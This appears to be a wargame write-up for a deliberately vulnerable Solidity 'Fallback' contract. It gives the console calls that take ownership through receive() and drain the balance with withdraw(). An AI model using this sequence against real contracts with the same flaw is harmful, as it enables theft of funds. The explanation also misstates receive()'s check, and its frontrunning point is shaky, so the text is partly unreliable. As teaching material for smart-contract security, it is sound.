### TASK
The task is to claim ownership of the contract and drain its balance to 0.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Fallback {

  mapping(address => uint) public contributions;
  address public owner;

  constructor() {
    owner = msg.sender;
    contributions[msg.sender] = 1000 * (1 ether);
  }

  modifier onlyOwner {
        require(
            msg.sender == owner,
            "caller is not the owner"
        );
        _;
    }

  function contribute() public payable {
    require(msg.value < 0.001 ether);
    contributions[msg.sender] += msg.value;
    if(contributions[msg.sender] > contributions[owner]) {
      owner = msg.sender;
    }
  }

  function getContribution() public view returns (uint) {
    return contributions[msg.sender];
  }

  function withdraw() public onlyOwner {
    payable(owner).transfer(address(this).balance);
  }

  receive() external payable {
    require(msg.value > 0 && contributions[msg.sender] > 0);
    owner = msg.sender;
  }
}
```

The contract's funds can be drained by calling the "withdraw" function, and this function can only be executed by the address that is set as the "owner" variable. This function will transfer all of the contract's funds to the address set as the "owner". 


### CODE VUNERABILITIES
##### The "contribute() function"

```solidity
 function contribute() public payable {
    require(msg.value < 0.001 ether);
    contributions[msg.sender] += msg.value;
    if(contributions[msg.sender] > contributions[owner]) {
      owner = msg.sender;
    }
  }
```

This function allows the msg.sender to send Ether to the contract, which will be added to the user's balance as tracked by the "contributions" mapping variable. If the total contribution made by the msg.sender is greater than the total contribution made by the current owner (as tracked by the "contributions" mapping variable), the msg.sender will become the new owner.
<br/>
This function could be vulnerable to a "frontrunning" attack, where an attacker can observe the transaction, and sends a larger amount of wei before the original transaction is mined, to become the new owner and some other vunerabilities.
<br/>

##### The 'recieve()' function 
The "receive" function is a special function in Solidity that is automatically executed when a user sends Ether to a contract without specifying any data in the "data" field of the transaction. This function does not require any specific function signature and can be defined by the developer as any other function in the contract.

```solidity
 receive() external payable {
    require(msg.value > 0 && contributions[msg.sender] > 0);
    owner = msg.sender;
  }
```

In the receive function, the owner is updated with msg.sender only if the amount of wei sent with the transaction is greater than 0, and the total contribution made by msg.sender in the contributions mapping is greater than the one made by the current owner. 


1. We need to first contribute a small amount of ether(in wei) to the contract;

```
   await contract.contribute({from: player, value:toWei("0.0004")})
```

2. Activate the receive function by sending ether to the contract;

```solidity
   await sendTransaction({from: player, value: toWei("0.0004"), to: instance, data: ""})
```

Now check the current owner, it should be your address

```
await contract.owner()
```

You can withdraw all the funds in the contract now by using;

```
  await contract.withdraw();
```

##### Conclusion
If an attacker can finds a way to change the value of the "owner" variable to their own address, they will be able to execute the "withdraw" function and drain all the funds from the contract. Therefore, it is important to ensure that the "owner" variable is protected and cannot be modified by unauthorized parties.

